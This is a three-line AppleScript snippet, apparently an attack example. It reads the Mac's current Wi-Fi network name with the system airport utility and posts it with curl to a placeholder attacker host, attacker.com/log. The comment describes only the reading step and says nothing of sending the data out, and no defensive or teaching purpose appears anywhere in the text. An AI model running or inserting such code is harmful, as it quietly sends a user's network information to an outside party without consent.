-- Reads current SSID
set ssid to do shell script "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | grep SSID"
do shell script "curl -d \"wifi=" & ssid & "\" http://attacker.com/log"
